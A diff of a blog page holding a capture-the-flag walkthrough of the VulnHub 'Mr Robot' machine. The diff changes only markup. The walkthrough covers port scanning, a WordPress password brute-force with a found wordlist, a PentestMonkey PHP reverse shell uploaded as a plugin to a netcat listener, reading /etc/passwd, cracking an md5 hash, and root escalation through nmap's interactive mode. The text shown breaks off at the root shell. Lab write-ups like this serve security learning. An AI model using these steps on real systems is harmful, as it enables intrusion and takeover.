@@ -44,13 +44,13 @@
 </div>
 
 <br>
-<p>I had some extra time this weekend so I decided to play Mr Robot hacking challenge. I heard a lot about that challenge but I didn&rsquo;t have time to hack it. 
+<p>I had some extra time this weekend so I decided to play Mr Robot hacking challenge. I heard a lot about that challenge but I didn&rsquo;t have time to hack it.
 Now was the time. I downloaded the virtual machine image from vulnhub, fired up virtulbox, started kali linux vm.</p>
 <p>Enumeration time, I always start with port scanning to see what services are running but to do so I need to find the machine&rsquo;s IP first. The easy way to do so is to use <code>netdiscover</code>.</p>
 <p>I added machine&rsquo;s IP to my hosts:</p>
-<pre><code>echo &quot;192.168.0.67  mrrobot.local&quot; &gt;&gt; /etc/hosts
+<pre tabindex="0"><code>echo &quot;192.168.0.67  mrrobot.local&quot; &gt;&gt; /etc/hosts
 </code></pre><p>Started Nmap scan:</p>
-<pre><code># nmap -sV -A -T4 mrrobot.local
+<pre tabindex="0"><code># nmap -sV -A -T4 mrrobot.local
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 08:30 EST
 Nmap scan report for mrrobot.local (192.168.0.67)
 Host is up (0.00077s latency).
@@ -81,7 +81,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 19.77 seconds
 
 </code></pre><p>As we can see above Apache was running on port 80 (HTTP) and 443 (HTTPS). So I launched Nikto to  run a scan on the website:</p>
-<pre><code>nikto -host http://mrrobot.local/
+<pre tabindex="0"><code>nikto -host http://mrrobot.local/
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.0.69
@@ -114,20 +114,20 @@ Nmap done: 1 IP address (1 host up) scanned in 19.77 seconds
 + 1 host(s) tested
 
 </code></pre><p>It seemed that we were dealing with a wordpress website, I ran wpscan on it and nothing interesting was returned. Usualy when I test a website I start by looking at robots.txt, we never know what it can reveals.</p>
-<pre><code>$ curl http://mrrobot.local/robots.txt
+<pre tabindex="0"><code>$ curl http://mrrobot.local/robots.txt
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 </code></pre><p>First key found:</p>
-<pre><code>$ curl http://mrrobot.local/key-1-of-3.txt
+<pre tabindex="0"><code>$ curl http://mrrobot.local/key-1-of-3.txt
 073403c8a58a1f80d943455fb30724b9
 </code></pre><p>I downloaded fsocity.dic locally:</p>
-<pre><code>$ curl http://mrrobot.local/fsocity.dic -o fsocity.dic
+<pre tabindex="0"><code>$ curl http://mrrobot.local/fsocity.dic -o fsocity.dic
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 7075k  100 7075k    0     0  20.3M      0 --:--:-- --:--:-- --:--:-- 20.3M
 </code></pre><p>fsocity.dic:</p>
-<pre><code>true
+<pre tabindex="0"><code>true
 false
 wikia
 from
@@ -162,13 +162,13 @@ category
 Alderson
 ...
 </code></pre><p>The file contained some familiar names related to Mr Robot theme such as <code>Robot</code>, <code>Elliot</code>, <code>mrrobot</code>, <code>Alderson</code>. Next step was to look at wordpress login page, the page suffred from information disclosure vulnerabilty, when putting an incorrect user, the page returned this error:</p>
-<pre><code>Error: invalid username.
+<pre tabindex="0"><code>Error: invalid username.
 </code></pre><p>Being Mr Robot themed vm, my thougt was that the username would be based off characters on the show, I stared to test the list mentionned above, I was correct the user name was: <code>Elliot</code></p>
 <p>My first attempt was to use the first key we found as Elliot&rsquo;s password but it failed my next step was to find what hash type the key was, it seemed to be unvalid md5 hash. From there I decided to use wpscan to perform a dictionary attack using the provided wordlist <code>fsocity.dic</code> on Wordpress instance.</p>
 <p><img src="/images/mrrobot_wp_bruteforce.png" alt="wp_bruteforce"></p>
 <p>Two hours later, I got the password: <code>ER28-0652</code>.</p>
 <p>So I logged in and pocked arround, my next mission was to get a shell on the machine. That could be easily done by uploading a PHP reverse shell as wordpress plugin. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PentestMonkey PHP reverse shell</a>, I added on top of the php source code a valid WP plugin comment, zipped it and uploaded.</p>
-<pre><code>&lt;?php
+<pre tabindex="0"><code>&lt;?php
 /**
 * @package Pwn Me
  */
@@ -240,7 +240,7 @@ $daemon = 0;
 $debug = 0;
 ...
 </code></pre><p>Once plugin uploaded I activated it and I got a shell on my listenner:</p>
-<pre><code># nc -lvp 4444
+<pre tabindex="0"><code># nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.36] from mrrobot.local [192.168.0.67] 43098
 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
@@ -250,7 +250,7 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 </code></pre><p>Logged in as deamon, time to explore, I always start by listing users on the machine:</p>
-<pre><code>$ less /etc/passwd
+<pre tabindex="0"><code>$ less /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -279,7 +279,7 @@ varnish:x:999:999::/home/varnish:
 robot:x:1002:1002::/home/robot:
 $ 
 </code></pre><p>The user robot looked intersting:</p>
-<pre><code>$ cd /home/robot
+<pre tabindex="0"><code>$ cd /home/robot
 $ ls
 key-2-of-3.txt
 password.raw-md5
@@ -291,7 +291,7 @@ $
 </code></pre><p>I used <a href="https://www.md5online.org/md5-decrypt.html">www.md5online.org</a> to decrypt robot&rsquo;s password hash.</p>
 <p><img src="/images/robot_decrypted_hash.png" alt="robot_hash"></p>
 <p>In order to change to robot user I had to launch an interactive shell, one solution was to use pty python module, python is installed by default on most linux distributions.</p>
-<pre><code>$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+<pre tabindex="0"><code>$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
 daemon@linux:/home/robot$ su - robot              
 su - robot
 Password: abcdefghijklmnopqrstuvwxyz
@@ -305,7 +305,7 @@ cat ke*
 $ 
 </code></pre><p>Second key found: <code>822c73956184f694993bede3eb39f959</code></p>
 <p>One step closer to pwn this box. At this point I started to pock arround. I found those services running:</p>
-<pre><code>$ netstat -lnp
+<pre tabindex="0"><code>$ netstat -lnp
 netstat -lnp
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -322,7 +322,7 @@ udp6       0      0 :::49019                :::*                                
 ...
 </code></pre><p>Those three services: FTP, Monit Linux, MySQL respectivly were listenning on local interface. Monit Linux caught my eye, I never dealt with it before. So I started googling for it but I quickly, got fed up.</p>
 <p>At this point I started looking for programs with SUID root privileges.</p>
-<pre><code>$ find / -perm -u=s -type f 2&gt;/dev/null
+<pre tabindex="0"><code>$ find / -perm -u=s -type f 2&gt;/dev/null
 find / -perm -u=s -type f 2&gt;/dev/null
 /bin/ping
 /bin/umount
@@ -343,7 +343,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 /usr/lib/pt_chown
 $ 
 </code></pre><p><code>/usr/local/bin/nmap</code> looked like a good candidate, old versions of this software had &ndash;interactive option, which meant I could run command as root:</p>
-<pre><code>$ nmap --interactive
+<pre tabindex="0"><code>$ nmap --interactive
 nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
@@ -354,7 +354,7 @@ uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
 waiting to reap child : No child processes
 nmap&gt; 
 </code></pre><p>I ran <code>!sh</code> to start sh session as root:</p>
-<pre><code>nmap&gt; !sh
+<pre tabindex="0"><code>nmap&gt; !sh
 !sh
 # id
 id
